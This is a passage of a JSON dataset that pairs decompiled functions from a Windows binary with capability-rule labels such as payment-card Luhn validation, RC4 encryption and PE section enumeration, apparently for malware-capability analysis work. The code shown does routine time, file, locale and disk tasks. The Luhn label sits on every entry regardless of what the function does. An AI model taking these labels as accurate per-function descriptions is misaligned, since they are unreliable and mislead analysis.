        "decompiled_code": "\nvoid fcn.00409ee8(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00406858();\n    if (iVar1 == 0) {\n        fcn.00406a14(1);\n        fcn.004054c0();\n    }\n    iVar1 = fcn.00406858();\n    if (iVar1 == 0) {\n        fcn.00406a14(1);\n        fcn.004054c0();\n    }\n    return;\n}\n",
        "token_count": 110
    },
    "00409ffc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00409ffc(uint param_1, uchar *param_2)\n\n{\n    uint uVar1;\n    uchar *arg_8h;\n    uchar *arg_8h_00;\n    uint var_10h;\n    uint var_4h;\n    \n    arg_8h = &stack0xfffffffc;\n    arg_8h_00 = &stack0xfffffffc;\n    uVar1 = fcn.0040b760();\n    if (uVar1 == '\\0') {\n        fcn.00409ee8();\n        fcn.00406860();\n        uVar1 = fcn.00409f78(arg_8h);\n        if (uVar1 == '\\0') {\n            fcn.00406860();\n            uVar1 = fcn.00409f78(arg_8h_00);\n            if (uVar1 != '\\0') {\n                *param_2 = 0;\n            }\n        }\n        else {\n            *param_2 = 1;\n        }\n    }\n    else {\n        *param_2 = _var_10h != *0x40a07c;\n    }\n    return uVar1;\n}\n",
        "token_count": 265
    },
    "0040a324": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040a324(uint param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint lpFileTime;\n    uint lpLocalFileTime;\n    uint32_t wFatTime;\n    \n    wFatTime = param_2;\n    iVar1 = sub.kernel32.dll_DosDateTimeToFileTime(param_2 >> 0x10, param_2 & 0xffff, &lpLocalFileTime);\n    if (((iVar1 != 0) && (iVar1 = sub.kernel32.dll_LocalFileTimeToFileTime(&lpLocalFileTime, &lpFileTime),  iVar1 != 0))\n       && (iVar1 = sub.kernel32.dll_SetFileTime(),  iVar1 != 0)) {\n        return 0;\n    }\n    uVar2 = sub.kernel32.dll_GetLastError_1();\n    return uVar2;\n}\n",
        "token_count": 195
    },
    "0040a37c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nulong fcn.0040a37c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iStack32;\n    int32_t iStack24;\n    uint *puStack20;\n    uint auStack16 [2];\n    \n    do {\n        puStack20 = auStack16;\n        if ((*(in_EAX + 0x20) & *(in_EAX + 0x18)) == 0) {\n            iStack24 = in_EAX + 0x34;\n            sub.kernel32.dll_FileTimeToLocalFileTime();\n            iStack32 = in_EAX + 2;\n            sub.kernel32.dll_FileTimeToDosDateTime(&iStack24);\n            *(in_EAX + 8) = *(in_EAX + 0x40);\n            *(in_EAX + 0xc) = *(in_EAX + 0x3c);\n            *(in_EAX + 0x10) = *(in_EAX + 0x20);\n            fcn.004056dc();\n            uVar2 = 0;\n            goto code_r0x0040a3f8;\n        }\n        puStack20 = in_EAX + 0x20;\n        auStack16[0] = *(in_EAX + 0x1c);\n        iVar1 = sub.kernel32.dll_FindNextFileA();\n    } while (iVar1 != 0);\n    uVar2 = sub.kernel32.dll_GetLastError_1();\ncode_r0x0040a3f8:\n    return CONCAT44(iStack32, uVar2);\n}\n",
        "token_count": 348
    },
    "0040a684": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040a684(void)\n\n{\n    uint uVar1;\n    uchar auStack272 [4];\n    uchar auStack268 [260];\n    \n    uVar1 = fcn.004058fc(0x104, auStack268, auStack272);\n    sub.kernel32.dll_GetFullPathNameA(uVar1);\n    fcn.0040555c();\n    return;\n}\n",
        "token_count": 85
    },
    "0040a6c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get disk size"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040a6c0(int32_t arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    uint uVar1;\n    ulong uVar2;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_8h == 0) {\n        arg_8h = 0;\n    }\n    uVar1 = sub.kernel32.dll_GetDiskFreeSpaceA(arg_8h, &var_4h, &var_8h, &var_ch, &var_10h);\n    uVar2 = fcn.004063ec(var_ch, 0);\n    *arg_ch = uVar2;\n    arg_ch[1] = uVar2 >> 0x20;\n    uVar2 = fcn.004063ec(var_10h, 0);\n    *arg_10h = uVar2;\n    arg_10h[1] = uVar2 >> 0x20;\n    return uVar1;\n}\n",
        "token_count": 248
    },
    "0040aaa0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * fcn.0040aaa0(void)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    \n    piVar1 = fcn.00402ef0();\n    *piVar1 = in_EAX + 4;\n    return piVar1 + 1;\n}\n",
        "token_count": 69
    },
    "0040b672": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040b672(void)\n\n{\n    int32_t unaff_EBP;\n    char *unaff_ESI;\n    uint var_ch;\n    \n    while( true ) {\n        if (*unaff_ESI - 0x3aU < 0xf6) break;\n        *(unaff_EBP + -0xc) = *unaff_ESI - 0x30;\n        unaff_ESI = unaff_ESI + 1;\n    }\n    return;\n}\n",
        "token_count": 106
    },
    "0040b68e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040b68e(void)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    char *unaff_ESI;\n    \n    uVar2 = 0;\n    if ((*unaff_ESI == '+') || (*unaff_ESI == '-')) {\n        unaff_ESI = unaff_ESI + 1;\n    }\n    do {\n        cVar1 = *unaff_ESI;\n        if (cVar1 - 0x3aU < 0xf6) {\n            return;\n        }\n        unaff_ESI = unaff_ESI + 1;\n        uVar2 = uVar2 * 10 + (cVar1 - 0x30);\n    } while (uVar2 < 500);\n    return;\n}\n",
        "token_count": 170
    },
    "0040b6c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b6c4(uint arg_8h)\n\n{\n    uint var_40h;\n    \n    fcn.0040b0b0(0, 0xf, 0);\n    fcn.0040555c();\n    return;\n}\n",
        "token_count": 61
    },
    "0040b6f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b6f4(uint arg_8h)\n\n{\n    uint var_40h;\n    \n    fcn.0040b0b0(0, 0, 0);\n    fcn.0040555c();\n    return;\n}\n",
        "token_count": 60
    },
    "0040b724": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nunkbyte10 fcn.0040b724(void)\n\n{\n    char cVar1;\n    unkbyte10 Stack24;\n    \n    fcn.004058fc();\n    cVar1 = fcn.0040b5b0();\n    if (cVar1 == '\\0') {\n        fcn.00409730();\n    }\n    return Stack24;\n}\n",
        "token_count": 78
    },
    "0040b77c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040b77c(uint param_1, double *param_2)\n\n{\n    char cVar1;\n    float10 fStack20;\n    \n    fcn.004058fc();\n    cVar1 = fcn.0040b5b0();\n    if (cVar1 != '\\0') {\n        *param_2 = fStack20;\n    }\n    return;\n}\n",
        "token_count": 88
    },
    "0040b7a8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040b7a8(uint param_1, float *param_2)\n\n{\n    char cVar1;\n    float10 fStack20;\n    \n    fcn.004058fc();\n    cVar1 = fcn.0040b5b0();\n    if (cVar1 != '\\0') {\n        *param_2 = fStack20;\n    }\n    return;\n}\n",
        "token_count": 89
    },
    "0040b7f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040b7f0(double param_1)\n\n{\n    uint64_t uVar1;\n    uint *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iStack16;\n    int32_t iStack12;\n    \n    uVar1 = ROUND(param_1 * *0x49088c);\n    iStack16 = uVar1;\n    iStack12 = uVar1 >> 0x20;\n    if (uVar1 < 0) {\n        uVar1 = CONCAT44(-(iStack16 != 0) - iStack12, -iStack16);\n        uVar3 = uVar1 % *0x490890;\n        iVar2 = -(uVar1 / *0x490890);\n    }\n    else {\n        iVar2 = uVar1 / *0x490890;\n        uVar3 = uVar1 % *0x490890;\n    }\n    *in_EAX = uVar3;\n    in_EAX[1] = iVar2 + 0xa955a;\n    return;\n}\n",
        "token_count": 235
    },
    "0040b834": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuchar __cdecl fcn.0040b834(double *arg_8h, uint arg_ch)\n\n{\n    uint16_t in_AX;\n    uint16_t in_CX;\n    uint16_t in_DX;\n    uint var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    if ((((in_AX < 0x18) && (in_DX < 0x3c)) && (in_CX < 0x3c)) && (arg_ch < 1000)) {\n        *arg_8h = (in_AX * 3600000 + in_DX * 60000 + in_CX * 1000 + arg_ch) / *0x40b8a0;\n        var_1h._0_1_ = 1;\n    }\n    return var_1h;\n}\n",
        "token_count": 212
    },
    "0040b8a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.0040b8a4(uint32_t arg_8h)\n\n{\n    char cVar1;\n    uint var_8h;\n    \n    cVar1 = fcn.0040b834(&var_8h, arg_8h & 0xffff);\n    if (cVar1 == '\\0') {\n        fcn.00409718();\n    }\n    return _var_8h;\n}\n",
        "token_count": 94
    },
    "0040b8e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b8e4(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint in_EDX;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040b7f0(arg_ch, arg_10h, &var_4h);\n    fcn.004096fc(arg_ch);\n    fcn.004096fc(in_EDX);\n    fcn.004096fc(arg_8h);\n    return;\n}\n",
        "token_count": 110
    },
    "0040ba48": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 fcn.0040ba48(void)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uint auStack20 [2];\n    \n    puVar2 = auStack20;\n    cVar1 = fcn.0040b97c(auStack20);\n    if (cVar1 == '\\0') {\n        fcn.00409718();\n    }\n    return CONCAT44(auStack20[0], puVar2);\n}\n",
        "token_count": 99
    },
    "0040ba78": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040ba78(int16_t *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint16_t uVar1;\n    int16_t iVar2;\n    uint16_t uVar3;\n    int16_t *in_EAX;\n    int32_t iVar4;\n    uint16_t *in_EDX;\n    uint32_t uVar5;\n    int16_t iVar6;\n    uint var_18h;\n    int32_t var_14h;\n    int16_t var_10h;\n    uint16_t var_eh;\n    int16_t *var_ch;\n    uint16_t *var_8h;\n    int16_t *var_4h;\n    \n    var_8h = in_EDX;\n    var_4h = in_EAX;\n    fcn.0040b7f0(arg_ch, arg_10h);\n    if (var_14h < 1) {\n        *var_4h = 0;\n        *var_8h = 0;\n        *var_ch = 0;\n        *arg_8h = 0;\n        uVar5 = 0;\n    }\n    else {\n        *arg_8h = var_14h % 7 + 1;\n        iVar6 = 1;\n        for (iVar4 = var_14h + -1; 0x23ab0 < iVar4; iVar4 = iVar4 + -0x23ab1) {\n            iVar6 = iVar6 + 400;\n        }\n        fcn.004096fc(&var_eh);\n        if (var_10h == 4) {\n            var_10h = 3;\n            var_eh = var_eh + 0x8eac;\n        }\n        iVar2 = var_10h * 0x68;\n        fcn.004096fc(&var_eh);\n        fcn.004096fc(&var_eh);\n        if (var_10h == 4) {\n            var_10h = 3;\n            var_eh = var_eh + 0x16d;\n        }\n        uVar5 = fcn.0040b940();\n        uVar3 = 1;\n        for (; uVar1 = *((uVar5 & 0xff) * 0x18 + 0x4907ee + uVar3 * 2),  uVar1 <= var_eh; var_eh = var_eh - uVar1) {\n            uVar3 = uVar3 + 1;\n        }\n        *var_4h = iVar6 + iVar2 + var_10h;\n        *var_8h = uVar3;\n        *var_ch = var_eh + 1;\n    }\n    return uVar5;\n}\n",
        "token_count": 604
    },
    "0040bbe4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040bbe4(uint arg_8h, uint arg_ch)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    fcn.0040b7f0(arg_8h, arg_ch);\n    return var_4h % 7 + 1;\n}\n",
        "token_count": 73
    },
    "0040bc0c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nfloat10 fcn.0040bc0c(void)\n\n{\n    float10 fVar1;\n    uchar auStack16 [16];\n    \n    sub.kernel32.dll_GetLocalTime(auStack16);\n    fVar1 = fcn.0040ba48();\n    return fVar1;\n}\n",
        "token_count": 63
    },
    "0040bc38": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nfloat10 fcn.0040bc38(void)\n\n{\n    float10 fVar1;\n    uint16_t uStack6;\n    \n    sub.kernel32.dll_GetLocalTime();\n    fVar1 = fcn.0040b8a4(uStack6);\n    return fVar1;\n}\n",
        "token_count": 63
    },
    "0040bc6c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nfloat10 fcn.0040bc6c(void)\n\n{\n    float10 fVar1;\n    ushort uStack16;\n    uint16_t uStack14;\n    uint uStack12;\n    \n    sub.kernel32.dll_GetLocalTime();\n    fVar1 = fcn.0040ba48();\n    uStack12 = SUB84(fVar1, 0);\n    fVar1 = fcn.0040b8a4(uStack14);\n    return fVar1 + CONCAT44(uStack12, CONCAT22(uStack14, uStack16));\n}\n",
        "token_count": 119
    },
    "0040bcbc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.0040bcbc(void)\n\n{\n    uchar auStack16 [16];\n    \n    sub.kernel32.dll_GetLocalTime();\n    return auStack16 & 0xffff;\n}\n",
        "token_count": 43
    },
    "0040bcd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040bcd0(int32_t arg_8h)\n\n{\n    int32_t in_EDX;\n    int32_t iVar1;\n    \n    iVar1 = 0x100 - *(arg_8h + -0x104);\n    if (in_EDX < iVar1) {\n        iVar1 = in_EDX;\n    }\n    if (iVar1 != 0) {\n        fcn.004030ec();\n    }\n    *(arg_8h + -0x104) = *(arg_8h + -0x104) + iVar1;\n    return;\n}\n",
        "token_count": 129
    },
    "0040bd30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040bd30(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_1ch._0_1_ = 0;\n    var_14h._0_1_ = 0;\n    arg_8h_00 = 1;\n    fcn.0040ab84(1, &var_20h, 4);\n    fcn.0040bcd0(arg_8h_00);\n    return;\n}\n",
        "token_count": 151
    },
    "0040c86c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040c86c(uint param_1, int32_t param_2)\n\n{\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    \n    if (param_2 == 0) {\n        fcn.0040c0b4(&stack0xfffffffc);\n    }\n    else {\n        fcn.0040c0b4(&stack0xfffffffc);\n    }\n    fcn.0040555c();\n    return;\n}\n",
        "token_count": 110
    },
    "0040cae0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040cae0(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    while( true ) {\n        uVar3 = fcn.0040572c();\n        if ((uVar3 < *param_2) || (cVar1 = *(in_EAX + -1 + *param_2),  uVar3 = cVar1 - 0x3a,  cVar1 - 0x30U < 10))\n        break;\n        uVar3 = *(in_EAX + -1 + *param_2);\n        if ((*((uVar3 >> 3) + 0x490820) >> (uVar3 & 7) & 1) == 0) {\n            *param_2 = *param_2 + 1;\n        }\n        else {\n            iVar2 = fcn.0040e724();\n            *param_2 = iVar2;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 244
    },
    "0040d18c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 fcn.0040d18c(void)\n\n{\n    char cVar1;\n    double dStack20;\n    \n    cVar1 = fcn.0040d1c0();\n    if (cVar1 == '\\0') {\n        fcn.00409730();\n    }\n    return dStack20;\n}\n",
        "token_count": 70
    },
    "0040d25c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0040d25c(void)\n\n{\n    int32_t iVar1;\n    uint uStack292;\n    uint uStack288;\n    uint uStack284;\n    uint uStack276;\n    uchar *puStack272;\n    uint uStack268;\n    uint uStack264;\n    uchar auStack260 [256];\n    \n    uStack264 = 0;\n    uStack268 = 0x100;\n    puStack272 = &stack0xfffffefc;\n    uStack276 = 0;\n    uStack284 = 0;\n    uStack288 = 0x3200;\n    uStack292 = 0x40d280;\n    for (iVar1 = sub.kernel32.dll_FormatMessageA();\n        (0 < iVar1 && (((&stack0xfffffedf)[iVar1] < 0x21 || ((&stack0xfffffedf)[iVar1] == 0x2e)))); iVar1 = iVar1 + -1)\n    {\n    }\n    uStack292 = 0x40d2a0;\n    fcn.0040555c();\n    return;\n}\n",
        "token_count": 238
    },
    "0040d2a8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get geographical location"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d2a8(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint lpLCData;\n    \n    iVar1 = sub.kernel32.dll_GetLocaleInfoA_1();\n    if (iVar1 < 1) {\n        fcn.004054c0();\n    }\n    else {\n        fcn.0040555c();\n    }\n    return;\n}\n",
        "token_count": 88
    },
    "0040d35c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040d35c(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    var_10h = 0;\n    var_14h = 0;\n    var_18h = 0;\n    uStack48 = 0x40d46f;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    var_4h = sub.kernel32.dll_GetThreadLocale_1();\n    iVar1 = 1;\n    do {\n        fcn.0040d320(&var_ch, 0xb, &stack0xfffffffc);\n        fcn.004054c0();\n        fcn.0040d320(&var_10h, 0xb, &stack0xfffffffc);\n        fcn.004054c0();\n        iVar1 = iVar1 + 1;\n    } while (iVar1 != 0xd);\n    iVar1 = 1;\n    do {\n        var_8h = (iVar1 + 5) % 7;\n        fcn.0040d320(&var_14h, 6, &stack0xfffffffc);\n        fcn.004054c0();\n        fcn.0040d320(&var_18h, 6, &stack0xfffffffc);\n        fcn.004054c0();\n        iVar1 = iVar1 + 1;\n    } while (iVar1 != 8);\n    *in_FS_OFFSET = uStack52;\n    fcn.00405490(0x40d476);\n    return;\n}\n",
        "token_count": 436
    },
    "0040d534": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0040d534(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    code **in_FS_OFFSET;\n    code *in_stack_ffffffc4;\n    code *pcStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack20 = 0x40d5cb;\n    pcStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &pcStack24;\n    puVar3 = &var_4h;\n    sub.kernel32.dll_GetThreadLocale_1();\n    fcn.0040d2a8(puVar3);\n    iVar1 = fcn.00409e90();\n    if (iVar1 - 3U < 3) {\n        uVar2 = sub.kernel32.dll_GetThreadLocale_1(iVar1, 4);\n        sub.kernel32.dll_EnumCalendarInfoA(fcn.0040d480, uVar2);\n        iVar4 = 7;\n        puVar3 = 0x4958f4;\n        do {\n            *puVar3 = 0xffffffff;\n            puVar3 = puVar3 + 1;\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n        uVar2 = sub.kernel32.dll_GetThreadLocale_1(iVar1, 3);\n        in_stack_ffffffc4 = fcn.0040d4bc;\n        sub.kernel32.dll_EnumCalendarInfoA(fcn.0040d4bc, uVar2);\n    }\n    *in_FS_OFFSET = in_stack_ffffffc4;\n    fcn.0040546c(0x40d5d2);\n    return;\n}\n",
        "token_count": 406
    },
    "0040d820": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040d820(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t in_EDX;\n    uint var_458h;\n    uint *var_358h;\n    uint var_354h;\n    uint *var_350h;\n    uint var_34ch;\n    int32_t var_348h;\n    uint var_344h;\n    int32_t var_340h;\n    uint var_33ch;\n    uint var_338h;\n    uint var_334h;\n    uint var_330h;\n    int32_t var_32ch;\n    int32_t var_320h;\n    uint var_312h;\n    uint var_212h;\n    uint var_10dh;\n    int32_t var_8h;\n    uint var_4h;\n    \n    sub.kernel32.dll_VirtualQuery_1();\n    if (var_320h == 0x1000) {\n        iVar3 = var_32ch;\n        iVar2 = sub.kernel32.dll_GetModuleFileNameA_1(var_32ch, &var_212h, 0x105);\n        if (iVar2 != 0) {\n            var_8h = in_EDX - var_32ch;\n            goto code_r0x0040d896;\n        }\n    }\n    iVar3 = *0x4957f8;\n    sub.kernel32.dll_GetModuleFileNameA_1();\n    var_8h = fcn.0040d814();\ncode_r0x0040d896:\n    fcn.0040e9ac(iVar3);\n    fcn.0040a8d8();\n    var_340h = 0x40d9a0;\n    var_338h = 0x40d9a0;\n    cVar1 = fcn.004047cc();\n    if (cVar1 != '\\0') {\n        var_340h = fcn.004058fc();\n        iVar3 = fcn.0040a84c();\n        if ((iVar3 != 0) && (*(var_340h + -1 + iVar3) != '.')) {\n            var_338h = 0x40d9a4;\n        }\n    }\n    uVar4 = fcn.00406afc(*(*0x492ab8 + 4), &var_312h, 0x100);\n    sub.user32.dll_LoadStringA_1(uVar4);\n    fcn.00404520();\n    var_358h = &var_458h;\n    var_354h._0_1_ = 4;\n    var_350h = &var_10dh;\n    var_34ch._0_1_ = 6;\n    var_348h = var_8h;\n    var_344h._0_1_ = 5;\n    var_33ch._0_1_ = 6;\n    var_334h._0_1_ = 6;\n    fcn.0040af3c(4, &var_358h);\n    fcn.0040a84c();\n    return;\n}\n",
        "token_count": 700
    },
    "0040da70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040da70(uint param_1, char param_2)\n\n{\n    uint in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.004054c0();\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 129
    },
    "0040daac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040daac(uint arg_8h, uint arg_ch)\n\n{\n    char in_DL;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    int32_t iStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_4h;\n    \n    var_4h = 0;\n    if (in_DL != '\\0') {\n        puStack40 = 0x40dac0;\n        fcn.00404964();\n    }\n    uStack44 = 0x40db06;\n    iStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    arg_8h_00 = &fcn.0040daac::var_4h;\n    puStack40 = &stack0xfffffffc;\n    fcn.0040af7c(arg_8h_00);\n    fcn.004054c0();\n    *in_FS_OFFSET = arg_8h_00;\n    uStack44 = 0x40db0d;\n    iStack48 = 0x40db05;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 259
    },
    "0040db2c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040db2c(uint param_1, char param_2)\n\n{\n    uint in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.004075f4();\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 130
    },
    "0040db68": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040db68(uint arg_8h, uint arg_ch)\n\n{\n    char in_DL;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    int32_t iStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    if (in_DL != '\\0') {\n        puStack44 = 0x40db7e;\n        fcn.00404964();\n    }\n    uStack48 = 0x40dbd4;\n    iStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    arg_8h_00 = &fcn.0040db68::var_4h;\n    puStack44 = &stack0xfffffffc;\n    fcn.004075f4();\n    fcn.0040af7c(arg_8h_00);\n    fcn.004054c0();\n    *in_FS_OFFSET = arg_8h_00;\n    uStack48 = 0x40dbdb;\n    iStack52 = 0x40dbd3;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 275
    },
    "0040dbfc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
